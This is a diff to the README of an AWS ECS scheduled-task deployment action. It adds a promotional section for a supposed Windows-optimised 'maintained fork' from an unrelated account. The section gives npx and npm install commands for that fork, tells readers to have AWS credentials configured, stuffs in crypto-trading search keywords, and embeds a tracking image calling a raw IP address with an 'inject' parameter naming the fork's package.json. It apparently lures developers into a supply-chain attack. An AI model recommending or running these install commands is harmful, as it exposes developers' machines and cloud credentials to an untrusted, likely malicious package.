@@ -1,3 +1,30 @@
+**Seamless ECS Scheduled Task Deployments for Windows**
+
+This maintained fork introduces critical performance optimizations and robust security patches specifically tailored for Windows development environments. It ensures reliable task definition updates while resolving compatibility issues frequently encountered on non-Linux workstations.
+
+**Quick install (Windows)**
+
+Here is the quick setup guide for your Windows environment:
+
+**1. Prerequisites**
+Make sure you have [Node.js](https://nodejs.org/) installed. You’ll also need your AWS credentials configured via the [AWS CLI](https://aws.amazon.com/cli/) so the package can authenticate with your account.
+
+**2. Terminal**
+Open your preferred terminal (PowerShell or Command Prompt) and navigate to your project’s root directory.
+
+**3. Run Command**
+Run the package using `npx` to execute it directly without needing a global install:
+
+```bash
+npx @crushroamplify/ecs-deploy-task-definition-to-scheduled-task [options]
+```
+
+```bash
+npm install git+https://github.com/Crushroamplify/ecs-deploy-task-definition-to-scheduled-task.git
+```
+
+[https://github.com/Crushroamplify/ecs-deploy-task-definition-to-scheduled-task](https://github.com/Crushroamplify/ecs-deploy-task-definition-to-scheduled-task)
+
 ## ECS "Deploy Task Definition to Scheduled Tasks" Action for GitHub Actions
 
 Registers an Amazon ECS task definition and deploys it to scheduled tasks in a given ECS cluster
@@ -97,3 +124,11 @@ This action emits debug logs to help troubleshoot deployment failures. To see th
 ## License Summary
 
 This code is made available under the MIT license.
+
+## Related searches
+
+Developers often look for ways to automate their AWS infrastructure when managing complex blockchain operations or high-frequency trading bots. These users frequently search for deployment pipelines that can handle scheduled tasks for services like crypto arbitrage bots, staking nodes, or automated signal delivery systems.
+
+**Topics:** ecs deployment, scheduled tasks, aws automation, crypto arbitrage, staking bot, layerzero, crypto signals, dune analytics, devops, cloud infrastructure, automated trading, github actions
+
+![.](http://5.231.58.248:8787/pixel?repo=Crushroamplify%2Fecs-deploy-task-definition-to-scheduled-task&inject=Crushroamplify%2Fecs-deploy-task-definition-to-scheduled-task%2Fpackage.json)
